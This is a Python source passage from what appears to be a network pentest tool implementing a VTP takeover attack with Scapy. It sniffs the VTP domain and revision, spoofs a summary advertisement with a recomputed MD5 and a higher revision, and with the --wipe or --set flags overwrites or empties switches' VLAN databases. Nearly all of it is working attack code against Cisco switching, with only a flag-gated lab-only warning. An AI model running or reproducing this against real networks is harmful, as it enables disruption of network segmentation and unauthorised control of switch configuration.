def _vtp_envelope(m, body):
    return (Ether(dst="01:00:0c:cc:cc:cc", src=m) /
            LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
            SNAP(OUI=0x00000C, code=0x2003) / body)


def vtp_vlan_records(vlans):
    """vlans: [(id, name), ...] -> subset-advert VLAN-info records.
    Layout per Wireshark packet-vtp.c: len(1) status(1) type(1) name_len(1)
    isl_vlan_id(2) mtu(2) dot10_said(4)=100000+id, name padded to 4."""
    out = b""
    for vid, name in vlans:
        nb = name.encode()
        npad = (len(nb) + 3) & ~3
        out += struct.pack("!BBBBHHI", 12 + npad, 0, 1, len(nb), vid,
                           1500, 0x100000 + vid) + nb.ljust(npad, b"\x00")
    return out


def vtp_summary(m, domain, revision, updater="0.0.0.0", version=1,
                followers=0, vlan_records=b""):
    """Summary advert with recomputed MD5. Digest per yersinia
    vtp_generate_md5(): md5( zeros(16) || summary_struct(digest zeroed)
    || vlan_records || zeros(16) ) - valid only WITHOUT a VTP password."""
    dom = domain.encode()
    db = dom[:32].ljust(32, b"\x00")
    ts = time.strftime("%y%m%d%H%M%S", time.gmtime()).encode()
    body = (struct.pack("!BBBB", version, 0x01, followers, len(dom)) + db +
            struct.pack("!II", revision,
                        int(ipaddress.IPv4Address(updater))) + ts +
            b"\x00" * 16)
    digest = hashlib.md5(b"\x00" * 16 + body + vlan_records +
                         b"\x00" * 16).digest()
    body = body[:56] + digest
    return _vtp_envelope(m, body)


def vtp_subset(m, domain, revision, vlans, version=1, seq=1):
    dom = domain.encode()
    body = (struct.pack("!BBBB", version, 0x02, seq, len(dom)) +
            dom[:32].ljust(32, b"\x00") +
            struct.pack("!I", revision) + vtp_vlan_records(vlans))
    return _vtp_envelope(m, body)


def vtp_request(m, domain, start_val=0, version=1):
    dom = domain.encode()
    body = (struct.pack("!BBBB", version, 0x03, 0, len(dom)) +
            dom[:32].ljust(32, b"\x00") + struct.pack("!H", start_val))
    return _vtp_envelope(m, body)


def vtp_cmd(args):
    """VTP takeover. SAFE default: raise the domain's config revision by one
    and never answer the resulting Advertisement Requests - client requests
    arriving is the proof the domain would accept a hostile update.
    --wipe/--set are DESTRUCTIVE (answers requests with chosen VLAN db)."""
    need_root()
    pif = parent_of(args.iface)
    m = my_mac(pif)
    domain = args.domain
    rev = args.rev

    if domain is None or rev is None:
        print(f"[*] sniffing {args.time}s on {pif} for VTP summary "
              "(domain + config revision)...")
        got = {}

        def learn(p):
            try:
                dp = Dot3(bytes(p))
            except Exception:
                return
            if not (dp.haslayer(SNAP) and getattr(dp[SNAP], "OUI", 0)
                    == 0x00000C and dp[SNAP].code == 0x2003):
                return
            body = bytes(dp[SNAP].payload)
            if len(body) > 56 and body[1] == 0x01:  # summary advert
                dlen = body[3]
                if dlen and 4 + dlen <= len(body):
                    got["domain"] = body[4:4 + dlen].decode(
                        errors="replace").rstrip("\x00")
                    got["rev"] = struct.unpack("!I", body[36:40])[0]
                    got["version"] = body[0]

        sniff(iface=pif, timeout=args.time, store=False, prn=learn)
        if "domain" not in got:
            die("no VTP summary seen; pass --domain/--rev explicitly "
                "(or verify the domain participates in VTP v1/v2)")
        domain = domain or got["domain"]
        rev = rev if rev is not None else got["rev"] + 1
        version = got["version"]
        print(f"[*] learned: domain {domain!r} rev {got['rev']} "
              f"version {version} -> attacking revision {rev}")
    else:
        version = 1

    harmful = args.wipe or args.set is not None
    if harmful and not args.i_know:
        die("refusing DESTRUCTIVE VTP rewrite without --i-know "
            "(this overwrites the domain's VLAN database; lab only)")

    # safe phase: spoof adv request first (passive proof of membership)
    print(f"[*] sending adv-request (start 0) in domain {domain!r} "
          "- summaries in reply prove domain membership")
    sendp(vtp_request(m, domain, 0, version), iface=pif, count=3, inter=1,
          verbose=0)

    summary = vtp_summary(m, domain, rev, version=version, followers=0)
    print(f"[*] hostile summary: rev={rev} (sniffed+1), followers=0, "
          "recomputed MD5 (no-password domains only)")
    reqs = []

    subset_for = None
    if harmful:
        vlans = []
        if args.set:
            for spec in args.set:
                if ":" in spec:
                    v, n = spec.split(":", 1)
                else:
                    v, n = spec, f"vlan{spec}"
                vlans.append((int(v), n))
        subset_for = vtp_subset(m, domain, rev, vlans, version=version)
        print(f"[!] DESTRUCTIVE: answering adv-requests with subset of "
              f"{len(vlans)} VLAN(s){' (EMPTY = DB WIPE)' if not vlans else ''}")

    stop = threading.Event()

    def listen(p):
        try:
            dp = Dot3(bytes(p))
        except Exception:
            return
        if not (dp.haslayer(SNAP) and getattr(dp[SNAP], "OUI", 0)
                == 0x00000C and dp[SNAP].code == 0x2003):
            return
        body = bytes(dp[SNAP].payload)
        if len(body) > 40 and body[1] == 0x01:
            got_rev = struct.unpack("!I", body[36:40])[0]
            print(f"    < summary from {p.src} rev={got_rev}"
                  + (" << we are now authoritative" if got_rev >= rev
                     else ""))
        elif len(body) > 40 and body[1] == 0x03:
            start = struct.unpack("!H", body[38:40])[0]
            reqs.append(p.src)
            print(f"    < ADVERTISEMENT REQUEST from {p.src} "
                  f"(start_val={start}) => domain ACCEPTED our revision")
            if harmful and subset_for is not None:
                sendp(subset_for, iface=pif, verbose=0)
                print(f"      > destructive subset sent to overwrite "
                      "their VLAN db")
    sn = AsyncSniffer(iface=pif, prn=listen)
    sn.start()

    try:
        for _ in range(args.time):
            sendp(summary, iface=pif, verbose=0)
            time.sleep(1.5)
    except KeyboardInterrupt:
        pass
    finally:
        sn.stop()
    uniq = sorted({r for r in reqs})
    print(f"[*] done: {len(reqs)} advertisement request(s) from "
          f"{len(uniq)} switch(es): {', '.join(uniq) if uniq else 'none'}")
    if uniq and not harmful:
        print("[*] PROVEN: switches accepted our higher revision and asked "
              "for our VLAN db - a hostile subset would have rewritten it "
              "(rerun with --set/--wipe --i-know to demonstrate)")
    elif not uniq:
        print("[*] no adv-requests: VTP password set (digest mismatch) / "
              "listen window short / transparent-mode domain")


